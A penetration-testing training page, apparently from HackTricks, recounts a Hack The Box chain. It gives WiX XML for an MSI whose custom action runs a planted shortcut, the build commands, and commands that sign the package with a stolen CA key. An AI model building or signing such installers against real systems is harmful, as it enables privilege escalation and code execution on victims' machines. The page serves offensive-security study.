# 使用 WiX 创建 Custom-Action MSI

{{#include ../../banners/hacktricks-training.md}}

这个历史上的 Hack The Box chain 使用 WiX Toolset v3 构建了一个会启动预先植入的 `.lnk` 文件的 MSI。**MSI 不会自动获得高权限**：其执行上下文取决于 Windows Installer policy、custom-action attributes 以及安装它的用户。在所引用的场景中，攻击者还窃取了一个受信任的签名 CA，并将签名后的 MSI 放入另一个用户监视的文件夹中。<sup>[[1]](#references)[[3]](#references)</sup>

要全面了解 wix MSI 的使用示例，建议参考[此页面](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)。其中包含多个演示 wix MSI 用法的示例。<sup>[[2]](#references)</sup>

该 MSI 会运行 `C:\Users\Public\Desktop\Shortcuts\rick.lnk`。原始的 WiX v3 XML 保留如下：<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
`InstallerVersion` 声明最低 Windows Installer 版本，`Compressed="yes"` 表示该 package 已压缩。`Stage1` 是 deferred，但设置了 `Impersonate="yes"`，因此它会使用安装用户的 impersonated token 运行；此场景中的 privilege change 来自之后打开 MSI 的 privileged user，而不是该 attribute magically 授予 SYSTEM。<sup>[[3]](#references)</sup>

使用 `candle.exe` 将源代码编译为 WiX object：<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
使用 `light.exe` 将该 object 链接到 MSI 中：<sup>[[1]](#references)</sup>
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### 原始链中使用的签名步骤

目标工作流接受由受入侵的内部 CA 签名的软件包。该 write-up 从恢复的 `MyCA.cer`/`MyCA.pvk` 中派生出签名证书，创建 PFX，并对 MSI 进行签名：<sup>[[1]](#references)</sup>
```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
-sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
The attacker then placed the signed package in `D:\DEV\MSIs` and waited for the privileged workflow/user to execute it. Preserve that precondition when adapting the technique: without an elevated installation path, unsafe policy such as `AlwaysInstallElevated`, or a privileged victim, this package executes only with the current user's rights.

## References

- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [A quick introduction: Create an MSI installer with WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — Deferred execution custom actions (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)

{{#include ../../banners/hacktricks-training.md}}
